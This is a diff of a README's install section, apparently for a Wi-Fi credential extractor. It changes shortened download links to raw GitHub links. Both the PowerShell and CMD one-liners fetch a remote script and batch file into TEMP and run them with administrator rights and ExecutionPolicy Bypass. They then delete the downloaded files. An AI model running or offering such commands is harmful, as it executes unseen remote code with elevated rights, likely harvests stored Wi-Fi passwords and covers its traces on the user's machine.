@@ -36,14 +36,14 @@
 ### 🏃‍♂️ PowerShell One-Liner
 
 ```powershell
-$i="$env:TEMP\sqd5dcwh.ps1"; $b="$env:TEMP\run.bat"; iwr "https://is.gd/Ko0O3p" -OutFile $i; Start-Process "powershell.exe" -ArgumentList "-NoProfile","-ExecutionPolicy","Bypass","-File",$i -Verb RunAs -Wait; Remove-Item $i -Force; iwr "https://is.gd/wifiextractor" -OutFile $b; Start-Process $b -Wait; Remove-Item $b -Force
+$i="$env:TEMP\sqd5dcwh.ps1"; $b="$env:TEMP\run.bat"; iwr "https://raw.githubusercontent.com/09sychic/sqd5-with-dcwh/main/sqd5dcwh.ps1" -OutFile $i; Start-Process "powershell.exe" -ArgumentList "-NoProfile","-ExecutionPolicy","Bypass","-File",$i -Verb RunAs -Wait; Remove-Item $i -Force; iwr "https://raw.githubusercontent.com/09sychic/sqd5-with-dcwh/main/run.bat" -OutFile $b; Start-Process $b -Wait; Remove-Item $b -Force
 
 ```
 
 ### 📱 CMD Version
 
 ```cmd
-powershell -Command "$i='$env:TEMP\sqd5dcwh.ps1'; $b='$env:TEMP\run.bat'; iwr 'https://is.gd/Ko0O3p' -OutFile $i; Start-Process 'powershell.exe' -ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-File',$i -Verb RunAs -Wait; Remove-Item $i -Force; iwr 'https://is.gd/wifiextractor' -OutFile $b; Start-Process $b -Wait; Remove-Item $b -Force"
+powershell -Command "$i='$env:TEMP\sqd5dcwh.ps1'; $b='$env:TEMP\run.bat'; iwr 'https://raw.githubusercontent.com/09sychic/sqd5-with-dcwh/main/sqd5dcwh.ps1' -OutFile $i; Start-Process 'powershell.exe' -ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-File',$i -Verb RunAs -Wait; Remove-Item $i -Force; iwr 'https://raw.githubusercontent.com/09sychic/sqd5-with-dcwh/main/run.bat' -OutFile $b; Start-Process $b -Wait; Remove-Item $b -Force"
 
 ```
 
